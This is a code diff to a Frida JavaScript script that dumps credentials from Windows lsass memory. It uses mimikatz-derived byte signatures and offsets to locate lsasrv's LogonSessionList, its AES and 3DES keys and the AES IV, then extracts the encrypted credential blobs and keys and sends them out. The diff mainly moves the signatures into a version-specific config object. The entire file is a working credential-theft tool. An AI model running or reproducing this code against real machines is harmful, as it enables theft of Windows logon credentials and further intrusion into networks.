@@ -4,6 +4,27 @@
 * Changes to the memory layout of lsass may require new signatures and offsets to be calculated.
 */
 
+
+
+// signatures from mimikatz, version dependent
+// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
+// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
+
+const WN1803 = {
+	"signatures": {
+		"WLsaEnumerateLogonSession": "33 ff 41 89 37 4c 8b f3 45 85 c9 74",
+		"LsaInitializeProtectedMemory": "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15"
+	},
+	"offsets": {
+		"LogonSessionList": 0x14,
+		"hAesKey": 0xD,
+		"h3DesKey": -0x5C,
+		"IV": 0x40
+	}
+};
+
+// Signature dereferencing
+
 function findDereferencedAddress(ptr) {
 	// Given a pointer to a RIP-relative LEA instruction, extract the address that the instruction dereferences.
 	// This is used to identify the location of global variables in lsass memory by finding instructions that dereference them. 
@@ -31,7 +52,7 @@ function findDereferencedAddress(ptr) {
 	return target;
 }
 
-//lsasrv!LogonSessionList parsing
+// lsasrv!LogonSessionList parsing
 
 function getLogonSessions(ptr, max) {
 	// Given a pointer to lsasrv!LogonSessionList, enumerate the address of all logon sessions that it contains.
@@ -91,7 +112,7 @@ function getPrimaryCredentialsFromLogonSession(ptr) {
 	return cryptoblob;
 }
 
-//lsasrv!hAesKey and lsasrv!h3DesKey parsing
+// lsasrv!hAesKey and lsasrv!h3DesKey parsing
 
 function getKey(ptr) {
 	// Given a pointer to the lsasrv!hAesKey or lsasrv!h3DesKey variable, extract the actual AES/3DES key.
@@ -120,25 +141,14 @@ function getAesIV(ptr) {
 
 // main()
 
-
 var lsasrv = Process.getModuleByName("lsasrv.dll")
-
-// signatures from mimikatz, version dependent
-// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
-// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
-var WLsaEnumerateLogonSession = "33 ff 41 89 37 4c 8b f3 45 85 c9 74"; 
-var LsaInitializeProtectedMemory = "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15"; 
-
-// Offsets:
-// WLsaEnumerateLogonSession Signature + 0x14 = lsasrv!LogonSessionList
-// LsaInitializeProtectedMemory Signature + 0xD = lsasrv!hAesKey
-// LsaInitializeProtectedMemory Signature - 0x5C = lsasrv!h3DesKey
-// LsaInitializeProtectedMemory Signature + 0x40 = IV for AES Key
+var signatures = WN1803.signatures; //hardcoded for now
+var offsets = WN1803.offsets; //hardcoded for now
 
 // scanning for WLsaEnumerateLogonSession(), used to identify lsasrv!LogonSessionList
-Memory.scan(lsasrv.base, lsasrv.size, WLsaEnumerateLogonSession, {
+Memory.scan(lsasrv.base, lsasrv.size, signatures.WLsaEnumerateLogonSession, {
 	onMatch(signature, size) {
-		var lea = signature.add(0x14);
+		var lea = signature.add(offsets.LogonSessionList);
 		var logonSessionList = findDereferencedAddress(lea);
 		var sessions = getLogonSessions(logonSessionList, 100);
 		
@@ -160,21 +170,21 @@ Memory.scan(lsasrv.base, lsasrv.size, WLsaEnumerateLogonSession, {
 });
 
 // scanning for LsaInitializeProtectedMemory(), used to identify lsasrv!hAesKey and lsasrv!h3DesKey
-Memory.scan(lsasrv.base, lsasrv.size, LsaInitializeProtectedMemory, {
+Memory.scan(lsasrv.base, lsasrv.size, signatures.LsaInitializeProtectedMemory, {
 	onMatch(signature, size) {
-		var lea = signature.add(0xD);
+		var lea = signature.add(offsets.hAesKey);
 		var aesKeyPtr = findDereferencedAddress(lea);
 		var aesKey = getKey(aesKeyPtr);
 		var output  = { "type": "aeskey" }
 		send(output, aesKey);
 
-		lea = signature.add(-0x5C);
+		lea = signature.add(offsets.h3DesKey);
 		var desKeyPtr = findDereferencedAddress(lea);
 		var desKey = getKey(desKeyPtr);
 		output = { "type": "3deskey" }
 		send(output, desKey);
 		
-		lea = signature.add(0x40);
+		lea = signature.add(offsets.IV);
 		var aesIVPtr = findDereferencedAddress(lea);
 		var aesIV = getAesIV(aesIVPtr);
 		output = { "type": "aes_iv" }
